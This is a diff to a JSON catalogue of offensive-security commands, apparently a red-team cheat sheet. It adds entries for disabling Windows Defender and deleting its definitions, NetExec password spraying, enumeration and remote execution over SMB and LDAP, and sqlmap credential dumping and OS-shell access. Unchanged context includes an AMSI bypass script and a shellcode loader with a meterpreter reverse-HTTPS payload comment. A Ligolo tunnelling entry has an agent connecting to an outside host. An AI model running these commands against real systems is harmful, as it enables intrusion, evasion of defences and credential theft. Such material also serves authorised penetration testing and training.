@@ -521,6 +521,28 @@
     "name": "Crackmapexec-Exec-SMB"
   },
   {
+    "description": "This technique disables Windows Defender\u2019s real-time protection, removes antivirus definitions, and turns off additional security features. Attackers use this to bypass Windows Defender (AV) and AMSI protections, allowing execution of malicious payloads without interference. This command requires to be Administrator.\n",
+    "command": "Set-MPPreference -DisableRealTimeMonitoring $true\n",
+    "code": "\"C:\\Program Files\\Windows Defender\\MpCmdRun.exe\" -RemoveDefinitions -All  \nGet-MPPreference  \nSet-MPPreference -DisableIOAVProtection $true  \nSet-MPPreference -DisableIntrusionPreventionSystem $true \n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      "AV"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "AV"
+    ],
+    "references": [
+      "https://learn.microsoft.com/en-us/powershell/module/defender/set-mppreference?view=windowsserver2025-ps",
+      "https://superuser.com/questions/1046297/how-do-i-turn-off-windows-defender-from-the-command-line"
+    ],
+    "name": "Defender-Disable-Protection"
+  },
+  {
     "description": "In this Amsi Bypass it copies C:\\Windows\\System32\\wscript.exe binary to a different location and rename in to AMSI.dll in order to prevent loading the real AMSI.dll. Add the code at the beginning of your evil Jscript file to turn off the AMSI.\n\nCommand Reference:\n```\nAMSI.dll: DLL to be overwritten\n\nwscript.exe: Excutable which will be copied into modified AMSI.dll\n\n-e:  option indicates that the specified script file will be processed by jscript.dll (GUID)\n\nGUID: F414C262-6AC0-11CF-B6D1-00AA00BBBB58\n```\n",
     "command": "AMSI Bypass in JScript renaming AMSI.dll\n",
     "code": "var filesys= new ActiveXObject(\"Scripting.FileSystemObject\"); \nvar sh = new ActiveXObject('WScript.Shell');\ntry\n{\n    if(filesys.FileExists(\"C:\\\\Windows\\\\Tasks\\\\AMSI.dll\")==0)\n    {\n        throw new Error(1, '');\n    } \n}\ncatch(e)\n{\n    filesys.CopyFile(\"C:\\\\Windows\\\\System32\\\\wscript.exe\", \"C:\\\\Windows\\\\Tasks\\\\AMSI.dll\");\n    sh.Exec(\"C:\\\\Windows\\\\Tasks\\\\AMSI.dll -e:{F414C262-6AC0-11CF-B6D1-00AA00BBBB58}\"+WScript.ScriptFullName);\n    WScript.Quit(1); \n}\n",
@@ -945,6 +967,28 @@
       "https://www.harmj0y.net/blog/redteaming/ghostpack/"
     ],
     "name": "SharpUp"
+  },
+  {
+    "description": "\"NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks.\" - https://www.netexec.wiki/. This command will enumerate domain groups, local groups, users, user descriptions, users trusted for delegation, users without a password, You can also use CIDR notation to target a range of ip addresses (i.e. 10.10.10.0/24).\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "nxc ldap 10.10.10.1 -u 'john' -p 'password123' --trusted-for-delegation  --password-not-required --admin-count --users --groups\n",
+    "items": [
+      "Username",
+      "Password"
+    ],
+    "services": [
+      "LDAP"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "references": [
+      "https://github.com/Pennyw0rth/NetExec",
+      "https://www.netexec.wiki/"
+    ],
+    "name": "NetExec-Enum-LDAP"
   },
   {
     "description": "ropnop's kerbrute bruteforces and enumerates valid Active Directory accounts through Kerberos Pre-Authentication. The following command will bruteforce an account against a list of provided passwords given a username.\n\nCommand Reference:\n\n\tDomain: test.local\n\n\tPassword List: passwords.txt\n\n\tUsername: john\n",
@@ -1734,6 +1778,25 @@
     "name": "sc-misconfiguration"
   },
   {
+    "description": "Identifying the Windows architecture (32-bit or 64-bit) is crucial during an attack to ensure the correct payloads and exploits are used. The following commands retrieve the operating system architecture using both Command Prompt (WMIC) and PowerShell.\n",
+    "command": "wmic os get OSArchitecture\n",
+    "code": "[System.Environment]::Is64BitOperatingSystem \n",
+    "items": [
+      "Shell"
+    ],
+    "services": [
+      "General"
+    ],
+    "OS": [
+      "Windows"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "references": null,
+    "name": "Windows-Architecture"
+  },
+  {
     "description": "Windows allows to use other users' credentials. This function also gives the option to save these credentials on the system. The command below will list saved credentials. While you can't see the actual passwords, if you notice any credentials worth trying, you can use them with the runas command and the /savecred option, as seen in extra code.\n",
     "command": "cmdkey /list\n",
     "code": "runas /savecred /user:admin cmd.exe \n",
@@ -1914,6 +1977,27 @@
     "name": "PyLDAPmonitor"
   },
   {
+    "description": "\"NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks.\" - https://www.netexec.wiki/. This command will enumerate the SMB host using anonymous access. \n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n",
+    "command": "nxc smb 10.10.10.1 -u 'a' -p ''\n",
+    "items": [
+      "No_Creds"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "references": [
+      "https://github.com/Pennyw0rth/NetExec",
+      "https://www.netexec.wiki/"
+    ],
+    "name": "NetExec-Enum-SMB-Anonymous"
+  },
+  {
     "description": "The DotNetToJscript project demonstrated how to execute C# assembly from Jscript. Build entire solution and in order to work with DotNetToJscript we need to have the following files on the target machine:\n\nCommand Reference:\n```\nDotNetToJscript.exe\nNDesk.Options.dll\nExampleAssembly.dll: output from C# solution, hold the C# assembly of what the code needs to do.\n\n```\n",
     "command": ".\\DotNetToJScript.exe .\\ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js\n",
     "code": "using System;\nusing System.Diagnostics;\nusing System.Runtime.InteropServices;\n\n[ComVisible(true)]\npublic class TestClass\n{\n    [DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]\n    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n\n    [DllImport(\"kernel32.dll\")]\n    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n\n    public TestClass()\n    {\n        // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.56.128 LPORT=443 -f csharp\n        byte[] buf = new byte[722] {0xfc,0x48,0x83, ... 0x56,0xff,0xd5};\n\n\n        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);\n        Marshal.Copy(buf, 0, addr, buf.Length);\n        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\n        WaitForSingleObject(hThread, 0xFFFFFFFF);\n   }\n\n    public void RunProcess(string path)\n    {\n        Process.Start(path);\n    }\n} \n",
@@ -2025,7 +2109,7 @@
     "name": "Impacket-atexec-Hash"
   },
   {
-    "description": "Ligolo is an advanced tunneling tool designed for red teaming and penetration testing. It enables attackers to establish reverse tunnels and pivot within a compromised network. The advantage of this tool is that the traffic is tunneled and you can run commands on the compromised network without added proxychains in the front of the command.\n\nCommand Reference:\n```\nPort: 8008\n\nIP address to which the agent must connect: 0.0.0.0\n```\n",
+    "description": "Ligolo is an advanced tunneling tool designed for red teaming and penetration testing. It enables attackers to establish reverse tunnels and pivot within a compromised network. The advantage of this tool is that the traffic is tunneled and you can run commands on the compromised network without added proxychains in the front of the command.\n\nCommand Reference:\n```\nPort: 8008\n\nIP address to which the agent must connect: 0.0.0.0\n\nCompromised network you want access to: 172.16.10.0/24\n```\n",
     "command": "ligolo-proxy -selfcert -laddr 0.0.0.0:8008\n",
     "code": "Create tap interface for ligolo:\nsudo ip tuntap add user root mode tun ligolo\nsudo ip link set ligolo up\n\nOn target machine run the agent:\n./agent -connect 192.168.49.52:8008 -ignore-cert\n\nAdd internal route of target device to ligolo interface:\nsudo ip route add 172.16.10.0/24 dev ligolo\n",
     "items": [
@@ -2295,6 +2379,27 @@
     "name": "Certipy-find"
   },
   {
+    "description": "\"NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks.\" - https://www.netexec.wiki/. This command will perform password spraying over SMB against the domain controller.\n\nCommand Reference:\n\n\tDomain Controller IP: 10.10.10.1\n\n\tUsername List: users.txt\n\n\tPassword: password123\n",
+    "command": "nxc smb 10.10.10.1 -u users.txt -p password123\n",
+    "items": [
+      "Username"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "references": [
+      "https://github.com/Pennyw0rth/NetExec",
+      "https://www.netexec.wiki/"
+    ],
+    "name": "NetExec-SMB-Password-Spray"
+  },
+  {
     "description": "Evil-WinRM uses the Windows Management Instrumentation (WMI) to give you an interactive shell on the Windows host. Winrm Supports PKINIT, meaning if you have a computers PFX file, you can authenticate and get a shell. Note that the command requires a public and a private key in PEM format, that can be extracted by converting the PFX to PEM format. Take a look at the references for more info on that. Password protected PFX files can be cracked with JohnTheRipper.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tPFX File: cert.pfx\n\n\tDomain: EVILCORP\n",
     "command": "evil-winrm -i 10.10.10.1 -c pub.pem -k priv.pem -S -r EVILCORP\n",
     "code": "openssl pkcs12 -in certificate.pfx -out certificate.pem -clcerts\n",
@@ -2471,6 +2576,28 @@
       "https://www.kali.org/tools/hydra/"
     ],
     "name": "Hydra-password_username"
+  },
+  {
+    "description": "\"NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks.\" - https://www.netexec.wiki/. This command will execute a powershell command on the target machine if the user has Administrator privileges. using \"-x\" will execute from cmd.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "nxc smb 10.10.10.1 -u 'john' -p 'password123' -X 'whoami'\n",
+    "items": [
+      "Username",
+      "Password"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "attack_types": [
+      "Exploitation"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "references": [
+      "https://github.com/Pennyw0rth/NetExec",
+      "https://www.netexec.wiki/"
+    ],
+    "name": "NetExec-Exec-SMB"
   },
   {
     "description": "Smbclient is a tool used to communicate with SMB servers. The following command will list out all available shares on the target server using valid credentials.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
@@ -3105,6 +3232,28 @@
     "name": "SMBMap-Enum-Share"
   },
   {
+    "description": "\"NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks.\" - https://www.netexec.wiki/. This command will enumerate domain groups, local groups, logged on users, relative identifiers (RIDs), sessions, domain users, SMB shares/permissions, and get the domain password policy. You can also use CIDR notation to target a range of ip addresses (i.e. 10.10.10.0/24).\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tUsername: john\n\n\tPassword: password123\n",
+    "command": "nxc smb 10.10.10.1 -u 'john' -p 'password123' --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol\n",
+    "items": [
+      "Username",
+      "Password"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "references": [
+      "https://github.com/Pennyw0rth/NetExec",
+      "https://www.netexec.wiki/"
+    ],
+    "name": "NetExec-Enum-SMB"
+  },
+  {
     "description": "Impacket's rpcdump.py enumerates Remote Procedure Call (RPC) endpoints.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
     "command": "python3 rpcdump.py test.local/john:password123@10.10.10.1\n",
     "items": [
@@ -3229,6 +3378,32 @@
       "https://github.com/ropnop/kerbrute"
     ],
     "name": "Kerbrute-BruteForce"
+  },
+  {
+    "description": "SQLMap is an automated SQL injection tool that helps identify and exploit SQL injection vulnerabilities in web applications. The following commands demonstrate how to extract databases, tables, and credentials, as well as gain shell access through SQL injection.\n\nCommand Reference:\n```\n-r: file with the request (from Burp)\n\n-p: vulnerable parameter\n\n-D: database name\n\n-T: table name\n\n--dump: action to be performed\n```\n",
+    "command": "sqlmap -r request_login.txt -p uname --risk=3 --level 5 -D music -T users --dump \n",
+    "code": "sqlmap -r request_login.txt -p song --risk 3 --level 5  --current-user\nsqlmap -r request_login.txt -p song --risk 3 --level 5  --is-dba\nsqlmap -r request_login.txt -p song --risk 3 --level 5  --hostname\nsqlmap -r request_login.txt -p song --risk 3 --level 5  --passwords\nsqlmap -r request_login.txt -p song --risk 3 --level 5  --privileges\nsqlmap -r request_login.txt -p song --risk 3 --level 5  --os-shell\nsqlmap -r search.txt -p artist --risk 3 --level 5  --sql-shell\n",
+    "items": [
+      "No_Creds"
+    ],
+    "services": [
+      "SQL"
+    ],
+    "OS": [
+      "Windows",
+      "Linux",
+      "Mac"
+    ],
+    "attack_types": [
+      "Injection",
+      "Enumeration",
+      "Exploitation"
+    ],
+    "references": [
+      "https://www.evolvesecurity.com/blog-posts/tools-of-the-trade-your-ally-in-uncovering-sql-injection-vulnerabilities",
+      "https://medium.com/cybersecurity-101/exploring-sql-injection-with-sqlmap-a-practical-guide-09e56e04d00f"
+    ],
+    "name": "sqlmap"
   },
   {
     "description": "Impacket's smbclient.py is a generic smbclient, allowing you to list shares and files, rename, upload and download files and create and delete directories.\n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword: password123\n",
@@ -3387,6 +3562,27 @@
     "name": "SMBClient-Enum-Share-Anonymous"
   },
   {
+    "description": "\"NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks.\" - https://www.netexec.wiki/. The following command will enumerate a list of SMB hosts with signing not enforced, allowing you to relay credentials to them using ntlmrelayx.py.\n\nCommand Reference:\n\n\tSMB Hosts: smb_hosts.txt\n",
+    "command": "nxc smb smb_host.txt --gen-relay-list output.txt\n",
+    "items": [
+      "No_Creds"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "references": [
+      "https://github.com/Pennyw0rth/NetExec",
+      "https://www.netexec.wiki/"
+    ],
+    "name": "NetExec-Enum-SMB-Relay-List"
+  },
+  {
     "description": "netstat is a command-line network tool that is a handy for enumerating services that are running on a machine. This command shows all the active network services using the TCP protocol.\n\nCommand Reference:\n```\nprotocol: tcp ( udp, icmp, ip, tcpv6, udpv6, icmpv6, or ipv6.)\n\n-a: Displays all active TCP connections and the TCP and UDP ports on which the computer is listening.\n\n-o: Displays active TCP connections and includes the process ID (PID) for each connection.\n\n-n: Displays active TCP connections, however, addresses and port numbers are expressed numerically and no attempt is made to determine names.\n```\n",
     "command": "netstat -aon -p tcp\n",
     "items": [
@@ -3454,6 +3650,27 @@
       "http://blog.redxorblue.com/2019/12/no-shells-required-using-impacket-to.html"
     ],
     "name": "Impacket-getST-Creds"
+  },
+  {
+    "description": "\"NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of large networks.\" - https://www.netexec.wiki/. This command will enumerate the SMB host using a null session. \n\nCommand Reference:\n\n\tTarget IP: 10.10.10.1\n",
+    "command": "nxc smb 10.10.10.1 -u '' -p ''\n",
+    "items": [
+      "No_Creds"
+    ],
+    "services": [
+      "SMB"
+    ],
+    "attack_types": [
+      "Enumeration"
+    ],
+    "OS": [
+      "Linux"
+    ],
+    "references": [
+      "https://github.com/Pennyw0rth/NetExec",
+      "https://www.netexec.wiki/"
+    ],
+    "name": "NetExec-Enum-SMB-Null"
   },
   {
     "description": "SharpHound.exe is the official data collector for BloodHound, written in C# and uses Windows API functions and LDAP namespace functions to collect data from domain controllers and domain-joined Windows systems. This data can then be fed into BloodHound to enumerate potential paths of privilege escalation. The following command peforms all collection methods and will use the provided LDAP credentials when performing LDAP collection methods, and stores the output in a zip file that can be directly placed in the BloodHound GUI.\n\nCommand Reference:\n\n\tLDAP Username: john\n\n\tLDAP Password: password123\n\n\tOutput File: output.zip\n",
